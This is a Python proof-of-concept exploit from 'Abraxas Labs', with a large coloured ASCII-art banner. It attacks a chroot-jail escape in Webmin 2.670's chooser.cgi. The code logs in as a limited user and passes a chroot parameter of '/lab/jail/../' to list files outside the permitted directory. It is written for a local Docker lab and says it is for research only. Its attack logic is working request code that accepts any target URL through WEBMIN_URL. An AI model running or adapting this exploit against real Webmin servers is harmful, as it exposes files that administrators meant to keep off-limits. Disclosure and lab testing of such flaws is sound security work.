#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: webmin-chooser-chroot (Medium: 5.3)
#  Vendor: Webmin
#  Versions: Webmin 2.670
#  Impact: chooser.cgi chroot prefix plus .. lists outside jail
#  Requires: Docker, git, python3
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "webmin-chooser-chroot"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _builtins.print(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _builtins.print(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_builtins.print = _cprint

"""Witness-only: chooser.cgi chroot prefix clears the jail, then lists outside it."""

import http.client
import os
import urllib.parse
from dataclasses import dataclass
from typing import Mapping

LABEL = "WEBMIN-H21-CHOOSER"
WITNESS = "WEBMIN-H21-CHOOSER"
IMAGE = "webmin-lab:2.670"
PIN = "2.670"
HOST = "127.0.0.1"
PORT = 18510
BASE_URL = os.environ.get("WEBMIN_URL", f"http://{HOST}:{PORT}").rstrip("/")
LIMITED_USER = "limited"
LIMITED_PASS = "limitedpass"
JAIL_ROOT = "/lab/jail"
# chooser.cgi:62-64 treats a string prefix of root as "inside" the jail.
CHROOT_ESCAPE = f"{JAIL_ROOT}/../"
# chooser.cgi:84 rejects .. only in file, not in chroot.
FILE_DOTDOT = "../"
ALLOWED = "allowed.txt"


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    headers: dict[str, str]
    cookies: dict[str, str]


def _cookie_header(cookies: Mapping[str, str]) -> str:
    return "; ".join(f"{name}={value}" for name, value in cookies.items())


def _parse_set_cookie(raw: str | None) -> dict[str, str]:
    found: dict[str, str] = {}
    if not raw:
        return found
    first = raw.split(";", 1)[0]
    if "=" not in first:
        return found
    name, value = first.split("=", 1)
    name = name.strip()
    if name:
        found[name] = value.strip()
    return found


def request(
    method: str,
    path: str,
    *,
    cookies: Mapping[str, str] | None = None,
    form: dict[str, str] | None = None,
    query: dict[str, str] | None = None,
    timeout: int = 30,
) -> HttpResult:
    url_path = path
    if query:
        url_path = f"{path}?{urllib.parse.urlencode(query)}"
    headers = {
        "Host": f"{HOST}:{PORT}",
        "User-Agent": "h21-chooser-lab",
        "Accept": "text/html,application/xhtml+xml",
        "Origin": BASE_URL,
        "Referer": f"{BASE_URL}/",
        "Connection": "close",
    }
    jar = dict(cookies or {})
    if jar:
        headers["Cookie"] = _cookie_header(jar)
    body: bytes | None = None
    if form is not None:
        body = urllib.parse.urlencode(form).encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Content-Length"] = str(len(body))
    try:
        conn = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
        conn.request(method, url_path, body=body, headers=headers)
        resp = conn.getresponse()
        raw = resp.read()
        hdrs = {key.lower(): value for key, value in resp.getheaders()}
        merged = dict(jar)
        for raw_cookie in resp.headers.get_all("Set-Cookie") or []:
            merged.update(_parse_set_cookie(raw_cookie))
        conn.close()
        return HttpResult(int(resp.status), raw.decode("utf-8", "replace"), hdrs, merged)
    except OSError as exc:
        return HttpResult(0, str(exc), {}, dict(jar))


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def listed(body: str, name: str) -> bool:
    return name in body


def clip(text: str, limit: int = 240) -> str:
    compact = " ".join((text or "").split())
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def main() -> int:
    log(f"IOC target={BASE_URL} user={LIMITED_USER} pin=webmin:{PIN} image={IMAGE}")

    login_page = request("GET", "/session_login.cgi")
    log(f"IOC login-get status={login_page.status}")
    if login_page.status not in {200, 401} or 'name="user"' not in login_page.body:
        log(f"IOC login-body={clip(login_page.body)}")
        return fail("login-page-missing")

    cookies = dict(login_page.cookies)
    cookies.setdefault("testing", "1")
    login = request(
        "POST",
        "/session_login.cgi",
        cookies=cookies,
        form={"user": LIMITED_USER, "pass": LIMITED_PASS, "page": "/"},
    )
    cookies.update(login.cookies)
    sid = cookies.get("sid", "")
    still_login = 'name="user"' in login.body and 'name="pass"' in login.body
    log(
        f"IOC login-post status={login.status} sid={int(bool(sid) and sid != 'x')} "
        f"still-login={still_login}"
    )
    if still_login or login.status not in {200, 302} or not sid or sid == "x":
        log(f"IOC login-body={clip(login.body)}")
        return fail("limited-login-failed")

    baseline = request(
        "GET",
        "/chooser.cgi",
        cookies=cookies,
        query={"frame": "1", "type": "0"},
    )
    log(
        f"IOC baseline status={baseline.status} "
        f"has-witness={int(listed(baseline.body, WITNESS))} "
        f"has-allowed={int(listed(baseline.body, ALLOWED))}"
    )
    if baseline.status != 200:
        log(f"IOC baseline-body={clip(baseline.body)}")
        return fail("baseline-chooser-http")
    if listed(baseline.body, WITNESS):
        return fail("baseline-already-outside")
    if not listed(baseline.body, ALLOWED):
        log(f"IOC baseline-body={clip(baseline.body)}")
        return fail("baseline-jail-missing")

    negative = request(
        "GET",
        "/chooser.cgi",
        cookies=cookies,
        query={"frame": "1", "type": "0", "file": FILE_DOTDOT},
    )
    log(
        f"IOC negative-file-dotdot status={negative.status} "
        f"has-witness={int(listed(negative.body, WITNESS))} "
        f"has-allowed={int(listed(negative.body, ALLOWED))}"
    )
    if negative.status != 200:
        log(f"IOC negative-body={clip(negative.body)}")
        return fail("negative-chooser-http")
    if listed(negative.body, WITNESS):
        return fail("file-dotdot-not-rejected")
    if not listed(negative.body, ALLOWED):
        return fail("negative-left-jail")

    escaped = request(
        "GET",
        "/chooser.cgi",
        cookies=cookies,
        query={"frame": "1", "type": "0", "chroot": CHROOT_ESCAPE},
    )
    log(
        f"IOC chroot-escape status={escaped.status} "
        f"chroot={CHROOT_ESCAPE} "
        f"has-witness={int(listed(escaped.body, WITNESS))} "
        f"has-allowed={int(listed(escaped.body, ALLOWED))}"
    )
    if escaped.status != 200:
        log(f"IOC escape-body={clip(escaped.body)}")
        return fail("escape-chooser-http")
    if not listed(escaped.body, WITNESS):
        log(f"IOC escape-body={clip(escaped.body)}")
        return fail("witness-not-listed")

    log(
        "SUCCESS "
        f"{LABEL} how=live chroot-prefix-escape=yes file-dotdot-rejected=yes "
        f"{WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

